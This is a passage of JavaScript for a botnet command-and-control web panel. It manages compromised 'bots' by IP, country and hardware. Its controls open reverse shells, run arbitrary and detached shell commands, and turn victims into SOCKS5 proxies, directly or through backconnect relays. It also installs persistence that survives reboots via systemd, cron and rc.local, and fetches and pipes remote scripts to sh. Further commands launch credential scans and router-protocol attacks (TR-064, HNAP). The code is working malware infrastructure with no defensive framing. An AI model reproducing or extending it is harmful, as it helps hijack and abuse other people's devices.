  html += '<button class="popup-act act-shell" onclick="closeBotPopup();openShell(\'' + id + '\')" data-tooltip="Open interactive reverse shell">Shell</button>';
  if (b.socksActive) {
    html += '<button class="popup-act act-stopsocks" onclick="confirmStopSocks(\'' + id + '\')" data-tooltip="Terminate the running SOCKS5 proxy on this bot">Stop SOCKS</button>';
  } else {
    html += '<button class="popup-act act-socks" onclick="popupStartSocks(\'' + id + '\')" data-tooltip="Start a SOCKS5 proxy — route your traffic through this bot">Start SOCKS</button>';
  }
  html += '<button class="popup-act act-persist" onclick="popupPersist(\'' + id + '\')" data-tooltip="Install triple-redundant persistence: copies binary to hidden dir, adds systemd unit, cron entry, and rc.local — survives reboots and cleanup attempts">Persist</button>';
  html += '<button class="popup-act act-kill" onclick="popupKill(\'' + id + '\')" data-tooltip="Wipe all persistence artifacts, delete the binary, and terminate — cannot be undone">Kill</button>';
  acts.innerHTML = html;
}

function positionPopup(ev) {
  var p = document.getElementById('bot-popup');
  p.classList.add('visible');
  var pw = p.offsetWidth, ph = p.offsetHeight;
  var left = ev.clientX + 12, top = ev.clientY - ph / 2;
  if (left + pw > window.innerWidth) left = ev.clientX - pw - 12;
  if (top + ph > window.innerHeight) top = window.innerHeight - ph - 8;
  if (top < 8) top = 8;
  p.style.left = left + 'px'; p.style.top = top + 'px';
}

function pinBotPopup(ev, botID) {
  ev.stopPropagation();
  var b = window._bots && window._bots[botID]; if (!b) return;
  popupPinned = true; popupBotID = botID; fillPopup(b); positionPopup(ev);
}
function closeBotPopup() { popupPinned = false; popupBotID = ''; document.getElementById('bot-popup').classList.remove('visible'); }

document.addEventListener('click', function (e) {
  if (!popupPinned) return;
  var p = document.getElementById('bot-popup');
  if (!p.contains(e.target) && !e.target.closest('.bot-row')) { closeBotPopup(); }
});

// ---------------------------------------------------------------------------
// Bot detail sidebar (left-click)
// ---------------------------------------------------------------------------

var _sidebarBotID = '';

function openBotSidebar(botID) {
  var b = window._bots && window._bots[botID]; if (!b) return;
  _sidebarBotID = botID;
  renderBotSidebar(b);
  document.getElementById('bds-title').textContent = botID;
  document.getElementById('bot-detail-sidebar').classList.add('open');
}

function closeBotSidebar() {
  _sidebarBotID = '';
  document.getElementById('bot-detail-sidebar').classList.remove('open');
}

function bdsSendCmd(botID, cmd) {
  if (!cmd) {
    var inp = document.getElementById('bds-cmd-input');
    if (!inp) return;
    cmd = inp.value.trim();
    if (!cmd) return;
    inp.value = '';
  }
  popupCmd(botID, cmd);
}

function renderBotSidebar(b) {
  var id = b.botID.replace(/'/g, "\\'");
  var eid = escHtml(b.botID);
  var socksColor = b.socksActive ? 'var(--green)' : 'var(--text-dim)';
  var socksLabel = b.socksActive ? 'ACTIVE' : 'OFFLINE';

  // ── Identity & hardware info ────────────────────────────────────────────
  var info =
    '<div class="isb-row"><span class="isb-label">Bot ID</span><span class="isb-val" style="color:var(--blue)">' + eid + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">IP</span><span class="isb-val">' + escHtml(b.ip) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Country</span><span class="isb-val" style="color:var(--cyan)">' + escHtml(b.country) + '</span></div>' +
    (b.group ? '<div class="isb-row"><span class="isb-label">Group</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.group) + '</span></div>' : '') +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">Arch</span><span class="isb-val">' + escHtml(b.arch) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">RAM</span><span class="isb-val">' + formatRAM(b.ram) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">CPU</span><span class="isb-val">' + b.cpuCores + ' cores</span></div>' +
    '<div class="isb-row"><span class="isb-label">Uplink</span><span class="isb-val">' + (b.uplinkMbps ? b.uplinkMbps.toFixed(1) + ' Mbps' : '—') + '</span></div>' +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">Process</span><span class="isb-val">' + escHtml(b.processName) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Uptime</span><span class="isb-val">' + escHtml(b.uptime) + '</span></div>' +
    '<div class="isb-row"><span class="isb-label">Last Ping</span><span class="isb-val">' + ago(b.lastPing) + '</span></div>' +
    '<div class="isb-divider"></div>' +
    '<div class="isb-row"><span class="isb-label">SOCKS</span><span class="isb-val" style="color:' + socksColor + '">' + socksLabel + '</span></div>' +
    (b.socksRelay ? '<div class="isb-row"><span class="isb-label">Relay</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.socksRelay) + '</span></div>' : '') +
    (b.socksUser  ? '<div class="isb-row"><span class="isb-label">SOCKS User</span><span class="isb-val">' + escHtml(b.socksUser) + '</span></div>' : '') +
    (b.socksStarted ? '<div class="isb-row"><span class="isb-label">Since</span><span class="isb-val">' + ago(b.socksStarted) + '</span></div>' : '');

  // ── Quick actions ────────────────────────────────────────────────────────
  var socksToggle = b.socksActive
    ? '<button class="bds-btn" onclick="confirmStopSocks(\'' + id + '\')" data-tooltip="Terminate the running SOCKS5 proxy on this bot">Stop SOCKS</button>'
    : '<button class="bds-btn" onclick="popupStartSocks(\'' + id + '\')" data-tooltip="Start a SOCKS5 proxy — route your traffic through this bot">Start SOCKS</button>';

  var actions =
    '<div class="bds-section">' +
    '<div class="bds-section-title">Actions</div>' +
    '<div class="bds-action-grid">' +
    '<button class="bds-btn bds-shell" onclick="openShell(\'' + id + '\')" data-tooltip="Open interactive reverse shell">Shell</button>' +
    socksToggle +
    '<button class="bds-btn" onclick="popupPersist(\'' + id + '\')" data-tooltip="Copy binary to hidden dir + install systemd unit — optionally provide a URL as fallback">Persist</button>' +
    '<button class="bds-btn" onclick="popupReinstall(\'' + id + '\')" data-tooltip="Fetch a new ELF or .sh from a URL and exec-replace the running bot process">Reinstall</button>' +
    '<button class="bds-btn" onclick="popupSetGroup(\'' + id + '\')" data-tooltip="Assign to a named group for batch targeting">Set Group</button>' +
    '<button class="bds-btn bds-kill" onclick="popupKill(\'' + id + '\')" data-tooltip="Wipe all persistence, delete binary, terminate — irreversible">Kill</button>' +
    '</div></div>';

  // ── Command console ──────────────────────────────────────────────────────
  var console_ =
    '<div class="bds-section">' +
    '<div class="bds-section-title">Send Command</div>' +
    '<div class="bds-cmd-row">' +
    '<input class="bds-cmd-input" id="bds-cmd-input" placeholder="!shell ls -la, !detach ..." ' +
      'title="Type any !command and press Enter or Send to run it on this bot specifically" ' +
      'onkeydown="if(event.key===\'Enter\')bdsSendCmd(\'' + id + '\')">' +
    '<button class="bds-btn" style="flex-shrink:0" onclick="bdsSendCmd(\'' + id + '\')" data-tooltip="Send command to this bot only">Send</button>' +
    '</div>' +
    '<div class="bds-cmd-chips">' +
    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!shell \'" data-tooltip="Run a command and return output">!shell</span>' +
    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!detach \'" data-tooltip="Run a command in the background, detached from the session">!detach</span>' +
    '<span class="bds-chip" onclick="document.getElementById(\'bds-cmd-input\').value=\'!stream \'" data-tooltip="Run a command with real-time line-by-line output streaming">!stream</span>' +
    '<span class="bds-chip" onclick="bdsSendCmd(\'' + id + '\',\'!stopsocks\')" data-tooltip="Stop the SOCKS5 proxy running on this bot">!stopsocks</span>' +
    '<span class="bds-chip" onclick="popupPersist(\'' + id + '\')" data-tooltip="Install persistence — optionally provide a fallback URL">!persist</span>' +
    '<span class="bds-chip" onclick="popupReinstall(\'' + id + '\')" data-tooltip="Fetch binary/script from URL and exec-replace this bot">!reinstall</span>' +
    '</div></div>';

  document.getElementById('bds-body').innerHTML = info + actions + console_;
}

// ---------------------------------------------------------------------------
// Popup commands
// ---------------------------------------------------------------------------

function popupCmd(botID, cmd) {
  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd, botID: botID }) })
    .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
    .catch(function () { showToast('Request failed', false); });
}

function popupKill(botID) {
  showConfirm({
    title: 'Kill bot?',
    message: 'Wipes persistence, deletes binary, and terminates. Cannot be undone.',
    icon: 'danger', confirmClass: 'danger', confirmText: 'Kill',
    details: [{label: 'Bot', val: botID}],
    onConfirm: function () { popupCmd(botID, '!kill'); closeBotPopup(); }
  });
}

function confirmStopSocks(botID) {
  showConfirm({
    title: 'Stop SOCKS proxy?',
    message: 'Terminates the active SOCKS backconnect session on this bot.',
    icon: 'warn', confirmClass: '', confirmText: 'Stop',
    details: [{label: 'Bot', val: botID}],
    onConfirm: function () { popupCmd(botID, '!stopsocks'); }
  });
}

function popupStartScan(botID) {
  var addr = prompt('Scan server address (host:port):', '');
  if (!addr || !addr.trim()) return;
  popupCmd(botID, '!scan ' + addr.trim());
}

function popupStartSocks(botID) {
  // Remove existing modal if any
  var old = document.getElementById('socks-modal-overlay');
  if (old) old.remove();

  var defUser = typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : 'admin';
  var defPass = typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : 'admin';

  var overlay = document.createElement('div');
  overlay.id = 'socks-modal-overlay';
  overlay.className = 'socks-modal-overlay';
  overlay.innerHTML =
    '<div class="socks-modal">' +
    '<div class="socks-modal-title">Start SOCKS5 Proxy</div>' +
    '<div class="socks-modal-fields">' +
    '<div class="socks-modal-field">' +
    '<label>Mode</label>' +
    '<select id="socks-m-mode" onchange="socksModalModeChange()">' +
    '<option value="direct">Direct (listen on bot)</option>' +
    '<option value="relay">Relay (backconnect)</option>' +
    '</select>' +
    '</div>' +
    '<div class="socks-modal-field" id="socks-m-port-row">' +
    '<label>Listen Port</label>' +
    '<input type="text" id="socks-m-port" value="1080" placeholder="1080">' +
    '</div>' +
    '<div class="socks-modal-field" id="socks-m-relay-row" style="display:none">' +
    '<label>Relay</label>' +
    '<select id="socks-m-relay"><option value="">Loading...</option></select>' +
    '</div>' +
    '<div class="socks-modal-field">' +
    '<label>Username</label>' +
    '<input type="text" id="socks-m-user" value="' + escHtml(defUser) + '" placeholder="username">' +
    '</div>' +
    '<div class="socks-modal-field">' +
    '<label>Password</label>' +
    '<input type="text" id="socks-m-pass" value="' + escHtml(defPass) + '" placeholder="password">' +
    '</div>' +
    '</div>' +
    '<div class="socks-modal-btns">' +
    '<button class="socks-modal-btn socks-modal-cancel" onclick="closeSocksModal()">Cancel</button>' +
    '<button class="socks-modal-btn socks-modal-start" onclick="submitSocksModal()">Start</button>' +
    '</div>' +
    '</div>';
  overlay.setAttribute('data-bot', botID);
  document.body.appendChild(overlay);

  // Close on overlay click
  overlay.addEventListener('click', function (e) {
    if (e.target === overlay) closeSocksModal();
  });

  // Fetch relays for dropdown
  fetch('/api/relays').then(function (r) { return r.json(); }).then(function (relays) {
    var sel = document.getElementById('socks-m-relay');
    if (!sel) return;
    sel.innerHTML = '';
    if (!relays || !relays.length) {
      sel.innerHTML = '<option value="">No relays configured</option>';
      return;
    }
    relays.forEach(function (r) {
      var opt = document.createElement('option');
      opt.value = r.host + ':' + r.controlPort;
      opt.textContent = r.name + ' (' + r.host + ':' + r.controlPort + ')';
      sel.appendChild(opt);
    });
  }).catch(function () {
    var sel = document.getElementById('socks-m-relay');
    if (sel) sel.innerHTML = '<option value="">Failed to load relays</option>';
  });

  requestAnimationFrame(function () { overlay.classList.add('open'); });
}

function socksModalModeChange() {
  var mode = document.getElementById('socks-m-mode').value;
  document.getElementById('socks-m-port-row').style.display = mode === 'direct' ? '' : 'none';
  document.getElementById('socks-m-relay-row').style.display = mode === 'relay' ? '' : 'none';
}

function closeSocksModal() {
  var el = document.getElementById('socks-modal-overlay');
  if (el) { el.classList.remove('open'); setTimeout(function () { el.remove(); }, 200); }
}

function submitSocksModal() {
  var overlay = document.getElementById('socks-modal-overlay');
  if (!overlay) return;
  var botID = overlay.getAttribute('data-bot');
  var mode = document.getElementById('socks-m-mode').value;
  var user = (document.getElementById('socks-m-user') || {}).value || '';
  var pass = (document.getElementById('socks-m-pass') || {}).value || '';

  if (mode === 'relay') {
    var relay = (document.getElementById('socks-m-relay') || {}).value;
    if (!relay) { showToast('No relay selected', false); return; }
    popupCmd(botID, '!socks ' + relay);
  } else {
    var port = (document.getElementById('socks-m-port') || {}).value || '1080';
    popupCmd(botID, '!socks ' + port);
  }
  if (user && pass) popupCmd(botID, '!socksauth ' + user + ' ' + pass);
  closeSocksModal();
}

// ---------------------------------------------------------------------------
// Command Center
// ---------------------------------------------------------------------------

var cmdArgDefs = {
  '!shell': [{ id: 'arg-shell-cmd', label: 'Command', placeholder: 'e.g. whoami, ls -la, cat /etc/passwd', tooltip: 'Shell command to execute on targeted bots. Output is returned via C2.' }],
  '!detach': [{ id: 'arg-detach-cmd', label: 'Command', placeholder: 'e.g. nohup ./payload &', tooltip: 'Command to run in background on bots. No output returned — fire and forget.' }],
  '!socks': [
    {
      id: 'arg-socks-mode', label: 'Mode', type: 'select', options: [
        { v: 'direct', t: 'Direct (listen on bot)' },
        { v: 'relay', t: 'Relay (backconnect)' }
      ]
    },
    { id: 'arg-socks-port', label: 'Listen Port', placeholder: 'e.g. 1080 (default)', showWhen: { field: 'arg-socks-mode', val: 'direct' }, tooltip: 'TCP port the SOCKS5 proxy listens on. Default 1080.' },
    { id: 'arg-socks-relay', label: 'Relay', type: 'select', options: [], showWhen: { field: 'arg-socks-mode', val: 'relay' }, tooltip: 'Relay server the bot backconnects to. Select from configured relays.' },
    { id: 'arg-socks-user', label: 'Auth Username (optional)', placeholder: typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : '', tooltip: 'SOCKS5 auth username. Leave empty for no auth.' },
    { id: 'arg-socks-pass', label: 'Auth Password (optional)', placeholder: typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : '', type: 'password', tooltip: 'SOCKS5 auth password. Leave empty for no auth.' }
  ],
  '!stopsocks': [],
  '!socksauth': [
    { id: 'arg-sa-user', label: 'Username', placeholder: 'socks username', tooltip: 'New SOCKS5 username to set on the bot proxy.' },
    { id: 'arg-sa-pass', label: 'Password', placeholder: 'socks password', type: 'password', tooltip: 'New SOCKS5 password to set on the bot proxy.' }
  ],
  '!info': [], '!persist': [],
  '!scan': [{ id: 'arg-scan-addr', label: 'Scan Server', placeholder: 'host:port (e.g. 1.2.3.4:48290)', tooltip: 'Address of the scan listener server that receives credential results from bots.' }],
  '!stopscan': [],
  '!tr064': [], '!stoptr064': [],
  '!hnap': [], '!stophnap': [],
  '!reinstall': [{ id: 'arg-reinstall-url', label: 'Script URL', placeholder: 'e.g. http://example.com/x.sh', tooltip: 'URL to a loader script. Bot kills itself, downloads this script, and pipes it to sh.' }],
  '!lolnogtfo': []
};

function updateArgFields() {
  var typ = document.getElementById('cmd-type').value;
  var wrap = document.getElementById('arg-fields');
  var defs = cmdArgDefs[typ] || [];
  if (!defs.length) { wrap.innerHTML = ''; return; }
  var html = '';
  defs.forEach(function (d) {
    var vis = d.showWhen ? 'display:none' : '';
    var tip = d.tooltip ? ' title="' + d.tooltip + '"' : '';
    html += '<div class="cmd-group" id="grp-' + d.id + '" style="' + vis + '"><label' + tip + '>' + d.label + (d.tooltip ? ' <span style="cursor:help;opacity:0.4;font-size:11px" title="' + d.tooltip + '">&#9432;</span>' : '') + '</label>';
    if (d.type === 'select') {
      html += '<select id="' + d.id + '"' + tip + ' onchange="updateConditionalFields()">';
      d.options.forEach(function (o) { html += '<option value="' + o.v + '">' + o.t + '</option>'; });
      html += '</select>';
    } else {
      html += '<input type="' + (d.type === 'password' ? 'password' : 'text') + '" id="' + d.id + '" placeholder="' + (d.placeholder || '') + '"' + tip + '>';
    }
    html += '</div>';
  });
  wrap.innerHTML = html;
  updateConditionalFields();
  // Populate relay dropdown if socks command
  if (typ === '!socks') { populateRelayDropdown(); }
}

function updateConditionalFields() {
  var typ = document.getElementById('cmd-type').value;
  (cmdArgDefs[typ] || []).forEach(function (d) {
    if (!d.showWhen) return;
    var el = document.getElementById(d.showWhen.field);
    var grp = document.getElementById('grp-' + d.id);
    if (el && grp) { grp.style.display = (el.value === d.showWhen.val) ? '' : 'none'; }
  });
}

function buildArgs() {
  var typ = document.getElementById('cmd-type').value;
  switch (typ) {
    case '!shell': return (document.getElementById('arg-shell-cmd') || {}).value || '';
    case '!detach': return (document.getElementById('arg-detach-cmd') || {}).value || '';
    case '!socks':
      var mode = (document.getElementById('arg-socks-mode') || {}).value || 'direct';
      if (mode === 'relay') {
        return (document.getElementById('arg-socks-relay') || {}).value || '';
      }
      return (document.getElementById('arg-socks-port') || {}).value || '';
    case '!socksauth':
      var u = (document.getElementById('arg-sa-user') || {}).value || '';
      var p = (document.getElementById('arg-sa-pass') || {}).value || '';
      return (u && p) ? u + ' ' + p : '';
    case '!reinstall': return (document.getElementById('arg-reinstall-url') || {}).value || '';
    case '!scan': return (document.getElementById('arg-scan-addr') || {}).value || '';
    default: return '';
  }
}

function sendCmd() {
  var typ = document.getElementById('cmd-type').value;
  var args = buildArgs().trim();
  var botID = document.getElementById('cmd-bot').value.trim();
  if ((typ === '!shell' || typ === '!detach') && !args) { showToast('Please enter a command', false); return; }
  if (typ === '!reinstall' && !args) { showToast('Please enter a script URL', false); return; }
  if (typ === '!socksauth') {
    var u = (document.getElementById('arg-sa-user') || {}).value || '';
    var p = (document.getElementById('arg-sa-pass') || {}).value || '';
    if (!u || !p) { showToast('Username and password required', false); return; }
  }

  if (typ === '!lolnogtfo' && !confirm('Kill all targeted bots? This cannot be undone.')) return;
  if (typ === '!reinstall' && !confirm('Run reinstall script on all targeted bots?')) return;
  var command = typ;
  if (args) command += ' ' + args;
  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: command, botID: botID }) })
    .then(function (r) { return r.json(); }).then(function (d) {
      showToast(d.message, d.success);
      // If !socks command, also send !socksauth if creds provided
      if (typ === '!socks' && d.success) {
        var su = (document.getElementById('arg-socks-user') || {}).value || '';
        var sp = (document.getElementById('arg-socks-pass') || {}).value || '';
        if (su && sp) {
          fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: '!socksauth ' + su + ' ' + sp, botID: botID }) });
        }
      }
    })
    .catch(function () { showToast('Request failed', false); });
}

// ---------------------------------------------------------------------------
// SOCKS Dashboard
// ---------------------------------------------------------------------------

function renderSocksDash() {
  if (!window._botsArr) return;
  var bots = window._botsArr;
  var active = bots.filter(function (b) { return b.socksActive; });
  var tabCount = document.getElementById('tab-socks-count');
  if (tabCount) tabCount.textContent = active.length;
  document.getElementById('socks-active').textContent = active.length;
  document.getElementById('socks-total').textContent = bots.length;
  var wrap = document.getElementById('socks-dash-wrap');
  if (!active.length) { wrap.innerHTML = '<div class="no-bots">No active SOCKS proxies</div>'; return; }
  var html = '<table class="socks-dash-table"><thead><tr><th>Bot ID</th><th>IP</th><th>Country</th><th>Port</th><th>Auth</th><th>Running Since</th><th></th></tr></thead><tbody>';
  active.forEach(function (b) {
    var id = b.botID.replace(/'/g, "\\'");
    html += '<tr><td style="color:var(--blue);font-family:monospace">' + escHtml(b.botID) + '</td>' +
      '<td style="font-family:monospace">' + escHtml(b.ip) + '</td>' +
      '<td><span class="country-badge">' + escHtml(b.country) + '</span></td>' +
      '<td style="color:var(--accent);font-family:monospace">' + (b.socksRelay || '-') + '</td>' +
      '<td>' + (b.socksUser || '<span style="color:var(--text-dim)">none</span>') + '</td>' +
      '<td>' + (b.socksStarted ? ago(b.socksStarted) : '-') + '</td>' +
      '<td><button class="socks-stop-btn" onclick="confirmStopSocks(\'' + id + '\')">Stop</button></td></tr>';
  });
  wrap.innerHTML = html + '</tbody></table>';
}



// ---------------------------------------------------------------------------
// Relay Management
// ---------------------------------------------------------------------------

var _relaysCache = [];

function populateRelayDropdown() {
  fetch('/api/relays').then(function (r) { return r.json(); }).then(function (relays) {
    _relaysCache = relays || [];
    var sel = document.getElementById('arg-socks-relay');
    if (!sel) return;
    sel.innerHTML = '';
    if (!relays.length) {
      sel.innerHTML = '<option value="">No relays configured</option>';
      return;
    }
    relays.forEach(function (r) {
      var opt = document.createElement('option');
      opt.value = r.host + ':' + r.controlPort;
      opt.textContent = r.name + ' (' + r.host + ':' + r.controlPort + ')';
      sel.appendChild(opt);
    });
  }).catch(function () { });
}

function loadRelays() { loadRelayStats(); }
function loadRelayAPIStatus() { loadRelayStats(); }

function loadRelayStats() {
  fetch('/api/relays/stats')
    .then(function (r) { return r.json(); })
    .then(renderRelayHealthCards)
    .catch(function () {});
}

function relayBytesStr(b) {
  if (!b) return '0 B';
  if (b >= 1073741824) return (b / 1073741824).toFixed(2) + ' GB';
  if (b >= 1048576) return (b / 1048576).toFixed(2) + ' MB';
  if (b >= 1024) return (b / 1024).toFixed(2) + ' KB';
  return b + ' B';
}

function renderRelayHealthCards(relays) {
  var wrap = document.getElementById('socks-relay-health');
  if (!wrap) return;
  if (!relays || !relays.length) {
    wrap.innerHTML =
      '<div class="relay-empty">' +
      '<span>No relays configured</span>' +
      '<button class="relay-add-btn" onclick="showAddRelayModal()" data-tooltip="Add a relay server to the pool">+ Add Relay</button>' +
      '</div>';
    return;
  }
  var html = '<div class="relay-health-grid">';
  relays.forEach(function (r) {
    var up = r.up;
    var dotCls = up ? 'sse-connected' : 'sse-disconnected';
    var uptime = r.uptimeSecs ? fmtUptimeSecs(r.uptimeSecs) : '—';
    var lastSeen = r.lastSeen ? ago(r.lastSeen) : 'never';
    html +=
      '<div class="relay-health-card">' +
      '<div class="rhc-header">' +
      '<span class="sse-indicator ' + dotCls + '" style="margin-right:8px"></span>' +
      '<span class="rhc-name">' + escHtml(r.name || '—') + '</span>' +
      '<span class="rhc-host">' + escHtml(r.host || '') + ':' + escHtml(r.socksPort || '1080') + '</span>' +
      '<button class="rhc-remove" onclick="removeRelay(\'' + escHtml(r.id) + '\')" data-tooltip="Remove this relay">&times;</button>' +
      '</div>' +
      '<div class="rhc-stats">' +
      '<div class="rhc-stat"><span class="rhc-stat-label">Active</span><span class="rhc-stat-val">' + (r.activeConns || 0) + '</span></div>' +
      '<div class="rhc-stat"><span class="rhc-stat-label">Total sessions</span><span class="rhc-stat-val">' + (r.totalSessions || 0) + '</span></div>' +
      '<div class="rhc-stat"><span class="rhc-stat-label">Bots</span><span class="rhc-stat-val">' + (r.connectedBots || 0) + '</span></div>' +
      '<div class="rhc-stat"><span class="rhc-stat-label">Up ↑</span><span class="rhc-stat-val">' + relayBytesStr(r.bytesUp) + '</span></div>' +
      '<div class="rhc-stat"><span class="rhc-stat-label">Down ↓</span><span class="rhc-stat-val">' + relayBytesStr(r.bytesDown) + '</span></div>' +
      '<div class="rhc-stat"><span class="rhc-stat-label">Failed</span><span class="rhc-stat-val">' + (r.failedSessions || 0) + '</span></div>' +
      '<div class="rhc-stat"><span class="rhc-stat-label">Uptime</span><span class="rhc-stat-val">' + uptime + '</span></div>' +
      '<div class="rhc-stat"><span class="rhc-stat-label">Last seen</span><span class="rhc-stat-val">' + lastSeen + '</span></div>' +
      '</div>' +
      '<div class="rhc-footer">' +
      '<code class="rhc-cmd">-c2 ' + location.origin + '/api/relay-report -name ' + escHtml(r.name || 'relay') + '</code>' +
      '</div>' +
      '</div>';
  });
  html += '<button class="relay-add-btn" onclick="showAddRelayModal()" data-tooltip="Add a relay server to the pool">+ Add Relay</button>';
  html += '</div>';
  wrap.innerHTML = html;
}

function fmtUptimeSecs(s) {
  if (s < 60) return s + 's';
  if (s < 3600) return Math.floor(s / 60) + 'm ' + (s % 60) + 's';
  var h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60);
  return h + 'h ' + m + 'm';
}

function removeRelay(id) {
  fetch('/api/relays?id=' + encodeURIComponent(id), { method: 'DELETE' })
    .then(function (r) { return r.json(); })
    .then(function () { loadRelayStats(); showToast('Relay removed', true); })
    .catch(function () { showToast('Failed to remove relay', false); });
}

function showAddRelayModal() {
  showUrlInput({
    title: 'Add Relay',
    message: 'Enter the relay address. The relay binary will connect to this CNC to push stats.',
    placeholder: 'relay.example.com',
    required: true,
    confirmText: 'Add',
    icon: 'warn',
    confirmClass: 'ok',
    onConfirm: function (host) {
      var parts = host.split(':');
      var body = {
        host: parts[0],
        controlPort: parts[1] || '9001',
        socksPort: parts[2] || '1080'
      };
      fetch('/api/relays', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      }).then(function (r) { return r.json(); })
        .then(function () { loadRelayStats(); showToast('Relay added', true); })
        .catch(function () { showToast('Failed to add relay', false); });
    }
  });
}

function humanBytes(b) {
  if (b < 1024) return b + ' B';
  if (b < 1048576) return (b / 1024).toFixed(1) + ' KB';
  if (b < 1073741824) return (b / 1048576).toFixed(1) + ' MB';
  return (b / 1073741824).toFixed(2) + ' GB';
}

// ---------------------------------------------------------------------------
// Activity Feed
// ---------------------------------------------------------------------------

var lastActivityLen = 0;
var activityTypeFilter = 'all';

function addActivityEntry(entry) {
  var al = document.getElementById('activity-list');
  var placeholder = al.querySelector('.no-bots'); if (placeholder) placeholder.remove();
  var div = document.createElement('div'); div.className = 'activity-entry';
  div.setAttribute('data-type', entry.type);
  div.innerHTML = '<span class="activity-time">' + escHtml(entry.time) + '</span>' +
    '<span class="activity-type ' + escHtml(entry.type) + '">' + escHtml(entry.type) + '</span>' +
    '<span class="activity-msg">' + escHtml(entry.message) + '</span>';
  al.appendChild(div);
  var entries = al.querySelectorAll('.activity-entry');
  if (entries.length > 500) entries[0].remove();
  filterActivity();
  addNotification(entry.time, entry.type + ': ' + entry.message);
}

function renderActivityFull(entries) {
  if (!entries || !entries.length) return;
  var al = document.getElementById('activity-list');
  al.innerHTML = entries.map(function (e) {
    return '<div class="activity-entry" data-type="' + escHtml(e.type) + '"><span class="activity-time">' + escHtml(e.time) + '</span>' +
      '<span class="activity-type ' + escHtml(e.type) + '">' + escHtml(e.type) + '</span>' +
      '<span class="activity-msg">' + escHtml(e.message) + '</span></div>';
  }).join('');
  if (entries.length > lastActivityLen) {
    entries.slice(lastActivityLen).forEach(function (e) { addNotification(e.time, e.type + ': ' + e.message); });
  }
  lastActivityLen = entries.length;
  filterActivity();
}

function toggleActivityFilter(el) {
  document.querySelectorAll('.activity-filter-chip').forEach(function (c) { c.classList.remove('active'); });
  el.classList.add('active');
  activityTypeFilter = el.getAttribute('data-type');
  filterActivity();
}

function filterActivity() {
  var q = (document.getElementById('activity-search') || {}).value || '';
  q = q.toLowerCase();
  var entries = document.querySelectorAll('#activity-list .activity-entry');
  var shown = 0;
  entries.forEach(function (e) {
    var type = (e.getAttribute('data-type') || '').toLowerCase();
    var typeMatch = activityTypeFilter === 'all' || type === activityTypeFilter;
    var textMatch = !q || e.textContent.toLowerCase().indexOf(q) !== -1;
    if (typeMatch && textMatch) { e.style.display = ''; shown++; }
    else { e.style.display = 'none'; }
  });
  var countEl = document.getElementById('activity-count');
  if (countEl) {
    if (q || activityTypeFilter !== 'all') { countEl.textContent = shown + '/' + entries.length; }
    else { countEl.textContent = entries.length ? entries.length + ' events' : ''; }
  }
}

function clearActivity() {
  document.getElementById('activity-list').innerHTML = '<div class="no-bots">No activity yet</div>';
  var countEl = document.getElementById('activity-count');
  if (countEl) countEl.textContent = '';
}

// ---------------------------------------------------------------------------
// Task Management
// ---------------------------------------------------------------------------

function updateTaskArgFields() {
  var typ = document.getElementById('task-type').value;
  var wrap = document.getElementById('task-arg-fields');
  var defs = cmdArgDefs[typ] || [];
  if (!defs.length) { wrap.innerHTML = ''; return; }
  var html = '';
  defs.forEach(function (d) {
    var vis = d.showWhen ? 'display:none' : '';
    html += '<div class="cmd-group" id="tgrp-' + d.id + '" style="' + vis + '"><label>' + d.label + '</label>';
    if (d.type === 'select') {
      html += '<select id="t-' + d.id + '" onchange="updateTaskConditionalFields()">';
      d.options.forEach(function (o) { html += '<option value="' + o.v + '">' + o.t + '</option>'; });
      html += '</select>';
    } else {
      html += '<input type="' + (d.type === 'password' ? 'password' : 'text') + '" id="t-' + d.id + '" placeholder="' + (d.placeholder || '') + '">';
    }
    html += '</div>';
  });
  wrap.innerHTML = html;
  updateTaskConditionalFields();
  if (typ === '!socks') { populateTaskRelayDropdown(); }
}

function updateTaskConditionalFields() {
  var typ = document.getElementById('task-type').value;
  (cmdArgDefs[typ] || []).forEach(function (d) {
    if (!d.showWhen) return;
    var el = document.getElementById('t-' + d.showWhen.field);
    var grp = document.getElementById('tgrp-' + d.id);
    if (el && grp) { grp.style.display = (el.value === d.showWhen.val) ? '' : 'none'; }
  });
}

function populateTaskRelayDropdown() {
  fetch('/api/relays').then(function (r) { return r.json(); }).then(function (relays) {
    var sel = document.getElementById('t-arg-socks-relay');
    if (!sel) return;
    sel.innerHTML = '';
    if (!relays || !relays.length) {
      sel.innerHTML = '<option value="">No relays configured</option>';
      return;
    }
    relays.forEach(function (r) {
      var opt = document.createElement('option');
      opt.value = r.host + ':' + r.controlPort;
      opt.textContent = r.name + ' (' + r.host + ':' + r.controlPort + ')';
      sel.appendChild(opt);
    });
  }).catch(function () { });
}

function buildTaskCommand() {
  var typ = document.getElementById('task-type').value;
  var args = '';
  switch (typ) {
    case '!shell': args = (document.getElementById('t-arg-shell-cmd') || {}).value || ''; break;
    case '!detach': args = (document.getElementById('t-arg-detach-cmd') || {}).value || ''; break;
    case '!socks':
      var mode = (document.getElementById('t-arg-socks-mode') || {}).value || 'direct';
      if (mode === 'relay') { args = (document.getElementById('t-arg-socks-relay') || {}).value || ''; }
      else { args = (document.getElementById('t-arg-socks-port') || {}).value || ''; }
      break;
    case '!socksauth':
